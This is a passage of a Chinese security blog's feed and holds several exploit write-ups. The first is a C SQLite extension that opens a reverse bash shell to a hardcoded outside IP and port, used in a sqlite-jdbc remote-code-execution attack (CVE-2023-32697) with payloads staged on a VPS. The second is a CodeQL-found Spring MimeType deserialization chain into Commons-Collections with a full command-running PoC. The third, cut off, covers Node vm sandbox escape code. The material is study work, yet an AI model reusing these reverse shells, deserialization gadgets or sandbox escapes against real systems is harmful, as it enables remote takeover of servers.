class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// rce.c 反弹shell用的  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span>    </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>    </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>    </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span>    </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span>    </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span>    </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span>    </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dirent.h&gt;</span>    </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sqlite3ext.h&gt;</span>    </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span>    </span></span><br><span class="line">    </span><br><span class="line">SQLITE_EXTENSION_INIT1    </span><br><span class="line">    </span><br><span class="line"><span class="comment">/* Configuration for the TCP connection */</span>    </span><br><span class="line"><span class="type">int</span> tcp_port = <span class="number">2333</span>;    </span><br><span class="line"><span class="type">char</span> *ip = <span class="string">&quot;116.62.38.71&quot;</span>;    </span><br><span class="line">    </span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN32    </span></span><br><span class="line">__declspec(dllexport)    </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>    </span></span><br><span class="line"><span class="comment">/**    </span></span><br><span class="line"><span class="comment"> * Initializes the SQLite extension. * * @param db SQLite database pointer * @param pzErrMsg Error message pointer * @param pApi SQLite API routines pointer * @return SQLITE_OK on success */</span><span class="type">int</span> <span class="title function_">sqlite3_extension_init</span><span class="params">(    </span></span><br><span class="line"><span class="params">    sqlite3 *db,    </span></span><br><span class="line"><span class="params">    <span class="type">char</span> **pzErrMsg,    </span></span><br><span class="line"><span class="params">    <span class="type">const</span> sqlite3_api_routines *pApi    </span></span><br><span class="line"><span class="params">)</span> &#123;    </span><br><span class="line">    <span class="type">int</span> rc = SQLITE_OK;    </span><br><span class="line">    SQLITE_EXTENSION_INIT2(pApi);    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* Establish a TCP connection and spawn a shell if running in a child process */</span>    </span><br><span class="line">    <span class="type">int</span> fd;    </span><br><span class="line">    <span class="keyword">if</span> ((fork()) &lt;= <span class="number">0</span>) &#123;    </span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span>    </span><br><span class="line">        addr.sin_family = AF_INET;    </span><br><span class="line">        addr.sin_port = htons(tcp_port);    </span><br><span class="line">        addr.sin_addr.s_addr = inet_addr(ip);    </span><br><span class="line">    </span><br><span class="line">        fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);    </span><br><span class="line">        <span class="keyword">if</span> (connect(fd, (<span class="keyword">struct</span> sockaddr*)&amp;addr, <span class="keyword">sizeof</span>(addr)) != <span class="number">0</span>) &#123;    </span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">// Exit if connection fails    </span></span><br><span class="line">        &#125;    </span><br><span class="line">    </span><br><span class="line">        <span class="comment">// Redirect standard file descriptors to the socket    </span></span><br><span class="line">        dup2(fd, <span class="number">0</span>);    </span><br><span class="line">        dup2(fd, <span class="number">1</span>);    </span><br><span class="line">        dup2(fd, <span class="number">2</span>);    </span><br><span class="line">    </span><br><span class="line">        <span class="comment">// Execute bash shell    </span></span><br><span class="line">        execve(<span class="string">&quot;/bin/bash&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> rc;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sqlite jdbc attack运行SQL命令，需要连接到构造好的数据库，构造方法如下：</p><p>使用navicat新建一个exp.db，然后创建一个视图，下面选中部分即为client连接之后执行的sql语句<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250430804.png" alt="Pasted image 20240525035351.png" title="wikilink"></p><p>缓存实际上就是对当前sqlite连接的数据库在&#x2F;tmp&#x2F;做一个备份，虽然第一次访问的是rce.so，但是程序仍会保存为.db文件，通过CoreConnection类可以知道缓存命名规则，文件名生成脚本如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> exp;    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">import</span> java.net.URL;    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cacheFilenameGen</span> &#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;    </span><br><span class="line">        Class.forName(<span class="string">&quot;org.sqlite.JDBC&quot;</span>);    </span><br><span class="line">        <span class="type">String</span> <span class="variable">writeUrl</span> <span class="operator">=</span> <span class="string">&quot;http://xxx/rce.so&quot;</span>;    </span><br><span class="line">        <span class="type">String</span> <span class="variable">triggerUrl</span> <span class="operator">=</span> <span class="string">&quot;http://xxx/exp.db&quot;</span>;    </span><br><span class="line">        <span class="type">String</span> <span class="variable">tmpDirRemote</span> <span class="operator">=</span> <span class="string">&quot;/tmp/sqlite-jdbc-tmp-&quot;</span>;    </span><br><span class="line">        <span class="type">String</span> <span class="variable">tmpDirLocal</span> <span class="operator">=</span> <span class="string">&quot;/var/folders/x8/mrcrl0p503nbmvy62sgmtk3m0000gn/T/sqlite-jdbc-tmp-&quot;</span>;    </span><br><span class="line">        <span class="type">String</span> <span class="variable">soFilePlace</span> <span class="operator">=</span> String.format(<span class="string">&quot;sqlite-jdbc-tmp-%d.db&quot;</span>, <span class="keyword">new</span> <span class="title class_">URL</span>(writeUrl).hashCode());    </span><br><span class="line">        System.out.println(soFilePlace);    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将 rce.so 和 exp.db 放到vps上，依次连接，执行写入缓存、触发SQL语句操作即可。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250435029.png" alt="image-20240525043551966"></p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250436448.png" alt="image-20240525043608391"></p><p>成功反弹shell<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250430805.png" alt="Pasted image 20240525042329.png" title="wikilink"></p><p>参考文章：</p><ul><li><a href="https://www.ctfiot.com/117914.html">CVE-2023-32697——sqlite jdbc RCE</a></li><li><a href="https://m0d9.me/2021/04/26/Jdbc%E7%A2%8E%E7%A2%8E%E5%BF%B5%E4%B8%89%EF%BC%9A%E5%86%85%E5%AD%98%E6%95%B0%E6%8D%AE%E5%BA%93/">Jdbc碎碎念三：内存数据库 | m0d9’s blog</a></li><li><a href="https://su18.org/post/jdbc-connection-url-attack/#sqlite">JDBC Connection URL Attack | 素十八 — JDBC Connection URL Attack | 素十八 (su18.org)</a></li><li><a href="https://github.com/su18/JDBC-Attack/blob/main/sqlite-attack/src/main/java/org/su18/jdbc/attack/AttackSQLite.java">su18 jdbc attack github</a></li><li><a href="https://xz.aliyun.com/t/13931">https://xz.aliyun.com/t/13931</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;主要复现一下ezjava，jdbc attack还是很有意思的&lt;/p&gt;
&lt;h2 id=&quot;simple-php&quot;&gt;&lt;a href=&quot;#simp</summary>
      
    
    
    
    
    <category term="Java" scheme="https://jaspersec.top/tags/Java/"/>
    
    <category term="php" scheme="https://jaspersec.top/tags/php/"/>
    
    <category term="jdbc attack" scheme="https://jaspersec.top/tags/jdbc-attack/"/>
    
    <category term="wp" scheme="https://jaspersec.top/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>Spring新入口类触发CC链</title>
    <link href="https://jaspersec.top/posts/3519640587.html"/>
    <id>https://jaspersec.top/posts/3519640587.html</id>
    <published>2024-04-18T16:00:00.000Z</published>
    <updated>2025-03-31T22:09:47.234Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>文章首发于先知社区<br>使用CodeQL在Spring组件里找到新的入口类MimeType，能够触发到LazyMap#get，进而触发CC链<br>简单记录了一下使用codeql挖链子的工作流程，本机环境和依赖：</p><ul><li>jdk 17.0.11</li><li>SpringBoot 3.1.10</li><li>CC 3.2.1</li><li>codeql cli 2.17.0</li></ul><h1 id="CodeQL起手式"><a href="#CodeQL起手式" class="headerlink" title="CodeQL起手式"></a>CodeQL起手式</h1><p>官方文档推荐使用vscode extension来搭建CodeQL环境，简单来说就是下面三个步骤：</p><ul><li>下载CodeQL CLI命令行工具，配置好终端环境变量</li><li>vscode安装CodeQL插件，配置好CodeQL CLI的路径</li><li>下载vscode-codeql-starter工作空间搭好框架，下一步是导入数据库，随便找一个项目java-sec-code，创建数据库命令的命令：</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create /Users/jasper/Documents/Security/tools/CodeQL/databases/java-sec-code-database --language=java --source-root=/Users/jasper/Documents/Security/java/java-sec-code --command=&quot;mvn clean package&quot;</span><br></pre></td></tr></table></figure><p>点侧栏点CodeQL插件，选Java、导入数据库、运行example.ql，能正常运行输出结果，说明环境正常，开挖<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405052152109.png" alt="image.png"></p><h1 id="编写查询"><a href="#编写查询" class="headerlink" title="编写查询"></a>编写查询</h1><p>CodeQL基础语法网上很多文章，基本是对着文档翻译的，可以直接从<a href="https://codeql.github.com/docs/writing-codeql-queries/">写查询语句</a>开始往下看，不多赘述<br>下面写一下找链子的流程，首先分析目标：找一个新的入口类，经过调用，能够触发到LazyMap#get<br>那么显然source就是readObject方法，在类中定义成员谓词写限定条件</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span> Source  </span><br><span class="line">class ReadObjectMethod extends <span class="keyword">Method</span> &#123;  </span><br><span class="line">    ReadObjectMethod()&#123;  </span><br><span class="line">        this.getDeclaringType() instanceof Serializable <span class="keyword">and</span>  </span><br><span class="line">        this.isPrivate() <span class="keyword">and</span>  </span><br><span class="line">        this.hasName(&quot;readObject&quot;) <span class="keyword">and</span>   </span><br><span class="line">        this.getReturnType() instanceof VoidType  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后再写sink点的限定条件，直接指定LazyMap全类名的get方法即可</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span> Sink  </span><br><span class="line">class LazyMapGetMethod extends <span class="keyword">Method</span> &#123;  </span><br><span class="line">    LazyMapGetMethod() &#123;  </span><br><span class="line">        this.getDeclaringType() instanceof Serializable <span class="keyword">and</span>  </span><br><span class="line">        this.isPublic() <span class="keyword">and</span>  </span><br><span class="line">        this.getReturnType() instanceof TypeObject <span class="keyword">and</span>  </span><br><span class="line">        this.hasName(&quot;get&quot;) <span class="keyword">and</span>   </span><br><span class="line">        this.getDeclaringType().hasQualifiedName(&quot;org.apache.commons.collections.map&quot;,&quot;LazyMap&quot;)  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行一下有45条结果，可以看到光MimeType就有几条路径可以调到LazyMap#get，随便找一条验证一下即可<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405052153402.png" alt="image.png"></p><p>实际上，直接把sink点定到transform也可以找到这条链子，它是可以直接打到ChainedTransformer#transfrom的<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405052152887.png" alt="image.png"></p><h1 id="链子分析和验证"><a href="#链子分析和验证" class="headerlink" title="链子分析和验证"></a><a href="https://jaspersec.top/2024/05/05/0x10%20Spring%E6%96%B0%E5%85%A5%E5%8F%A3%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91CC%E9%93%BE/#%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90%E5%92%8C%E9%AA%8C%E8%AF%81" title="链子分析和验证"></a>链子分析和验证</h1><p>以找到的最简单的路径为例，通过MimeType入口类触发getParameter到LazyMap#get，调用链如下：<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405052153403.png" alt="image.png"></p><p>然后拼上CC1-LazyMap后半段，验证链子是否有效，函数调用栈如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">transform:<span class="number">120</span>, InvokerTransformer (org.apache.commons.collections.functors)  </span><br><span class="line">transform:<span class="number">123</span>, ChainedTransformer (org.apache.commons.collections.functors)  </span><br><span class="line"><span class="keyword">get</span>:<span class="number">158</span>, LazyMap (org.apache.commons.collections.map)  </span><br><span class="line">getParameter:<span class="number">328</span>, MimeType (org.springframework.util)  </span><br><span class="line">readObject:<span class="number">677</span>, MimeType (org.springframework.util)  </span><br><span class="line">invoke0:<span class="number">-1</span>, NativeMethodAccessorImpl (jdk.internal.reflect)  </span><br><span class="line">invoke:<span class="number">77</span>, NativeMethodAccessorImpl (jdk.internal.reflect)  </span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (jdk.internal.reflect)  </span><br><span class="line">invoke:<span class="number">568</span>, <span class="keyword">Method</span> (java.lang.reflect)  </span><br><span class="line">invokeReadObject:<span class="number">1104</span>, ObjectStreamClass (java.io)  </span><br><span class="line">readSerialData:<span class="number">2434</span>, ObjectInputStream (java.io)  </span><br><span class="line">readOrdinaryObject:<span class="number">2268</span>, ObjectInputStream (java.io)  </span><br><span class="line">readObject0:<span class="number">1744</span>, ObjectInputStream (java.io)  </span><br><span class="line">readObject:<span class="number">514</span>, ObjectInputStream (java.io)  </span><br><span class="line">readObject:<span class="number">472</span>, ObjectInputStream (java.io)  </span><br><span class="line">unserializeBase64:<span class="number">38</span>, SerializeUtils (utils)  </span><br><span class="line">main:<span class="number">34</span>, Test (Test)</span><br></pre></td></tr></table></figure><p>MimeType#readObject会调用this.getParameter(“charset”)</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405052153405.png" alt="image.png"></p><p>getParameter会调用this.parameters.get(“chatset”)<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405052153406.png" alt="image.png"></p><p>parameters正好是Map类型的，我们用反射把变量设置成LazyMap对象即可</p><p>需要注意的是，jdk17中反射修改变量会存在权限问题，所以这里使用unsafe修改parameters变量<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405052153407.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405052153079.png" alt="image.png"></p><p>Poc如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span> Test.java  </span><br><span class="line">package Test;  </span><br><span class="line">import org.apache.commons.collections.Transformer;  </span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line">import org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">import org.springframework.util.MimeType;  </span><br><span class="line">import sun.misc.Unsafe;  </span><br><span class="line">import java.lang.reflect.Field;  </span><br><span class="line">import java.util.<span class="operator">*</span>;  </span><br><span class="line">  </span><br><span class="line">import utils.<span class="operator">*</span>;  </span><br><span class="line">  </span><br><span class="line">public class Test &#123;  </span><br><span class="line">    public <span class="keyword">static</span> void main(String[] args) throws Exception &#123;  </span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers <span class="operator">=</span> <span class="keyword">new</span> Transformer[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(&quot;getMethod&quot;,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;&quot;getRuntime&quot;,<span class="keyword">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(&quot;invoke&quot;,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(&quot;exec&quot;, <span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;&quot;open -a Calculator&quot;&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        ChainedTransformer chainedTransformer <span class="operator">=</span> <span class="keyword">new</span> ChainedTransformer(transformers);  </span><br><span class="line">        HashMap map <span class="operator">=</span> <span class="keyword">new</span> HashMap();  </span><br><span class="line">        Map map1 <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        Field field <span class="operator">=</span> Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        Unsafe unsafe <span class="operator">=</span> (Unsafe)field.get((Object)<span class="keyword">null</span>);  </span><br><span class="line">        MimeType mimeType <span class="operator">=</span> (MimeType) unsafe.allocateInstance(MimeType.class);  </span><br><span class="line">        unsafe.putObject(mimeType,unsafe.objectFieldOffset(MimeType.class.getDeclaredField(&quot;parameters&quot;)),map1);  </span><br><span class="line">  </span><br><span class="line">        String pld <span class="operator">=</span>  SerializeUtils.serializeBase64(mimeType);  </span><br><span class="line">        SerializeUtils.unserializeBase64(pld);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405052153408.png" alt="image.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;文章首发于先知社区&lt;br&gt;使用CodeQL在Spring组件里找到新的入口类MimeType，能够触发到LazyMap#get，进而触发CC</summary>
      
    
    
    
    
    <category term="Java" scheme="https://jaspersec.top/tags/Java/"/>
    
    <category term="CC" scheme="https://jaspersec.top/tags/CC/"/>
    
    <category term="反序列化" scheme="https://jaspersec.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="codeql" scheme="https://jaspersec.top/tags/codeql/"/>
    
    <category term="代码审计" scheme="https://jaspersec.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>vm2沙盒逃逸源码分析</title>
    <link href="https://jaspersec.top/posts/2134485987.html"/>
    <id>https://jaspersec.top/posts/2134485987.html</id>
    <published>2024-02-07T07:50:00.000Z</published>
    <updated>2025-03-31T22:09:47.233Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>vm2在2023年7月已经停止维护了，本文仅用作nodejs沙盒逃逸思路的学习。</p><h1 id="vm"><a href="#vm" class="headerlink" title="vm"></a>vm</h1><h2 id="vm-API"><a href="#vm-API" class="headerlink" title="vm API"></a>vm API</h2><p>vm的API比较简单，掌握下面这种即可，它结合了其他API命令。</p><ul><li>vm.Script(code)：将要执行的code进行预编译</li><li>script.runInNewContext()：创建和global隔离的作用域（context）当作沙箱，并且执行script的代码</li></ul><p>下面是vm使用模板，运行之后可以发现，沙盒内部代码无法访问到沙盒外部变量global.a</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="variable language_">global</span>.<span class="property">a</span> = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">const</span> cmd = <span class="string">`</span></span><br><span class="line"><span class="string">(()=&gt;&#123;</span></span><br><span class="line"><span class="string">    a = 2;</span></span><br><span class="line"><span class="string">    return a;</span></span><br><span class="line"><span class="string">&#125;)();</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.<span class="title class_">Script</span>(cmd);</span><br><span class="line"><span class="keyword">let</span> result = script.<span class="title function_">runInNewContext</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result);        <span class="comment">// 2</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a);             <span class="comment">// 1</span></span><br></pre></td></tr></table></figure><p>vm逃逸的本质是，想办法获取到context外部的对象，然后利用global.process实现命令执行。</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1702648787232-181d55f2-cd65-4b27-a307-10002fb5fb26.png" alt="图 1-1" title="图 1-1"></p><h2 id="this逃逸"><a href="#this逃逸" class="headerlink" title="this逃逸"></a>this逃逸</h2><p>逃逸点：沙盒里的this默认指向context沙盒。<br>如图1-1所示，context就是沙箱，它由runInNewContext创建，跟进源码会发现context本质就是一个空对象。</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1702649943505-44c3346e-d5a9-46f7-9fcd-5a879ec7271c.png" alt="image.png"></p><p>而在沙箱内，<strong>this默认就是指向当前作用域，也就是context这个空对象</strong>，下面通过调试验证这个结论。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> file = <span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/sandbox.js`</span>;</span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.<span class="title class_">Script</span>(fs.<span class="title function_">readFileSync</span>(file), file);</span><br><span class="line"><span class="keyword">let</span> result = script.<span class="title function_">runInNewContext</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">jasper</span> = <span class="string">&quot;is fucking cute&quot;</span>;  <span class="comment">// breakpoint</span></span><br></pre></td></tr></table></figure><p>可以看到，我们在沙盒里对this赋值，context这个对象同样会被赋值，验证了我们的猜想。</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1702650669090-a21721ba-0083-4f5e-a7b1-9774a95da88d.png" alt="image.png"></p><p>这会导致一个什么问题呢？<br>this指向context，而context显然由外部创建，运行内部代码this却能访问到外部对象context，这就是<strong>逃逸点</strong>。<br>找到逃逸点之后，自然是想办法rce，这里是找Function，然后返回process，调用它的命令执行函数。<br>为什么是this.constructor.constructor呢？了解到Function(‘return process’)()满足要求，问题变成如何获取外部Function，显然通过逃逸点this</p><ul><li>this空对象</li><li>this.constructor           function Object</li><li>this.constructor.constructor     functionFunction</li></ul><p>实际上，Object.constructor 能取到functionFunction，是因为Object继承了Function.prototype，而unction.prototype.constructor &#x3D;&#x3D;&#x3D; Function，具体原因参见原型链污染。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> cmd = <span class="string">`</span></span><br><span class="line"><span class="string">(()=&gt;&#123;</span></span><br><span class="line"><span class="string">    const p = this.constructor.constructor(&#x27;return process&#x27;)();</span></span><br><span class="line"><span class="string">    var result = p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString();</span></span><br><span class="line"><span class="string">    return result;</span></span><br><span class="line"><span class="string">&#125;)();</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.<span class="title class_">Script</span>(cmd);</span><br><span class="line"><span class="keyword">const</span> context = vm.<span class="title function_">createContext</span>();</span><br><span class="line"><span class="keyword">let</span> result = script.<span class="title function_">runInContext</span>(context);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br></pre></td></tr></table></figure><p>对于this逃逸，一种修复方案是：将context的原型置为null，这样我们就无法通过原型链获取process了。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> file = <span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/sandbox.js`</span>;</span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.<span class="title class_">Script</span>(fs.<span class="title function_">readFileSync</span>(file), file);</span><br><span class="line"><span class="keyword">const</span> sandbox = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">const</span> context = vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line"><span class="keyword">let</span> result = script.<span class="title function_">runInContext</span>(context);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span 